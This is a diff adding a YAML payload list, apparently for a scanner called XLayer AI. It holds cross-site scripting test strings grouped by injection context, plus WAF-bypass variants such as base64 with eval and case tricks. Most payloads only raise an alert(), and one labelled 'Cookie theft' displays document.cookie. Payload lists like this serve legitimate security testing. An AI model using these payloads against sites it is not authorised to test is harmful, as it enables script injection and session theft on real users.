@@ -1,0 +1,95 @@
+# XLayer AI - Cross-Site Scripting Payloads
+
+html_context:
+  - payload: "<script>alert('XSS')</script>"
+    description: "Basic script tag"
+    tags: [basic, html]
+  
+  - payload: "<script>alert(document.domain)</script>"
+    description: "Domain alert"
+    tags: [basic, html]
+  
+  - payload: "<img src=x onerror=alert('XSS')>"
+    description: "Img onerror"
+    tags: [basic, html]
+  
+  - payload: "<svg onload=alert('XSS')>"
+    description: "SVG onload"
+    tags: [basic, html]
+  
+  - payload: "<body onload=alert('XSS')>"
+    description: "Body onload"
+    tags: [basic, html]
+  
+  - payload: "<input onfocus=alert('XSS') autofocus>"
+    description: "Input autofocus"
+    tags: [basic, html]
+  
+  - payload: "<details open ontoggle=alert('XSS')>"
+    description: "Details ontoggle"
+    tags: [html5, html]
+
+attribute_context:
+  - payload: '" onmouseover="alert(\'XSS\')"'
+    description: "Double quote attribute injection"
+    tags: [attribute]
+  
+  - payload: "' onfocus='alert(1)' autofocus='"
+    description: "Single quote attribute injection"
+    tags: [attribute]
+  
+  - payload: '" autofocus onfocus="alert(1)'
+    description: "Autofocus injection"
+    tags: [attribute]
+
+javascript_context:
+  - payload: "';alert('XSS');//"
+    description: "JS string break (single)"
+    tags: [javascript]
+  
+  - payload: '";alert("XSS");//'
+    description: "JS string break (double)"
+    tags: [javascript]
+  
+  - payload: "'-alert('XSS')-'"
+    description: "JS expression injection"
+    tags: [javascript]
+  
+  - payload: "</script><script>alert('XSS')</script>"
+    description: "Script tag break"
+    tags: [javascript]
+
+url_context:
+  - payload: "javascript:alert('XSS')"
+    description: "Javascript protocol"
+    tags: [url]
+  
+  - payload: "data:text/html,<script>alert('XSS')</script>"
+    description: "Data URI"
+    tags: [url]
+
+dom_based:
+  - payload: "#<script>alert('XSS')</script>"
+    description: "Hash-based DOM XSS"
+    tags: [dom]
+  
+  - payload: "javascript:alert(document.cookie)"
+    description: "Cookie theft"
+    tags: [dom]
+
+waf_bypass:
+  - payload: "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>"
+    description: "Base64 encoded"
+    tags: [bypass]
+  
+  - payload: "<svg/onload=alert('XSS')>"
+    description: "No space"
+    tags: [bypass]
+  
+  - payload: "<ScRiPt>alert('XSS')</ScRiPt>"
+    description: "Case variation"
+    tags: [bypass]
+  
+  - payload: "<script>alert`XSS`</script>"
+    description: "Template literal"
+    tags: [bypass]
